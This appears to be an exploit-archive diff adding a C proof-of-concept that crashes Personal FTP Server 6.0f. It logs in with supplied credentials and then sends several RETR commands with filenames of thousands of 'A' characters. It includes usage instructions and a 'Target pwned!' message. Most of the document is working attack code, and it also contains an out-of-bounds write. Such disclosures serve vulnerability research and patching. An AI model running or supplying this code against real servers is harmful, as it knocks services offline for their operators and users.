@@ -1,0 +1,77 @@
+/*
+*** The Personal FTP Server 6.0f RETR DOS exploit ***
+
+A vulnerability exists in the way Personal FTP Server handles
+multiple RETR commands with overly long filenames.When confronted
+with such consecutive requests the server will crash.
+
+Usage : ./pftpdos ip port user password
+Ex. : ./pftpdos 127.0.0.1 21 test test
+
+Personal FTP Server homepage: http://www.michael-roth-software.de/
+
+Discovey + POC by Shinnok raydenxy [at] yahoo <dot> com
+http://shinnok.evonet.ro
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <malloc.h>
+#include <errno.h>
+
+int
+min (int x, int y)
+{
+    if (x < y)return x;
+    else
+    return y;
+}
+extern int errno;
+
+int
+main (int argc, char *argv[])
+{
+    struct sockaddr_in server;
+    int i, t, s;
+    char *req, *buff;
+    s = socket (AF_INET, SOCK_STREAM, 0);
+    bzero (&server, sizeof (server));
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = inet_addr (argv[1]);
+    server.sin_port = htons (atoi (argv[2]));
+    connect (s, (struct sockaddr *) &server, sizeof (struct sockaddr));
+    req = malloc (sizeof (char) * \
+    (((strlen (argv[3]) - strlen (argv[4])) + \
+    min (strlen (argv[3]), strlen (argv[4])) + 8)));
+    sprintf (req, "USER %s\xD\xA", argv[3]);
+    write (s, req, strlen (req));
+    sprintf (req, "PASS %s\xD\xA", argv[4]);
+    write (s, req, strlen (req));
+    free (req);
+    for (i = 1; i <= 5; i++)
+    {
+        t = (sizeof (char) * 1000 * i);
+        buff = malloc (t + 1);
+        memset (buff, 'A', t);
+        buff[t + 1] = '\0';
+        req = malloc (t + 9);
+        sprintf (req, "RETR %s\xD\xA", buff);
+        if (write (s, req, strlen (req)) == -1)
+        {
+            perror (NULL);
+            printf ("Target pwned!\n", errno);
+        }
+        free (req);
+        free (buff);
+        sleep (1);
+    }
+    close (s);
+    return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-09-14]
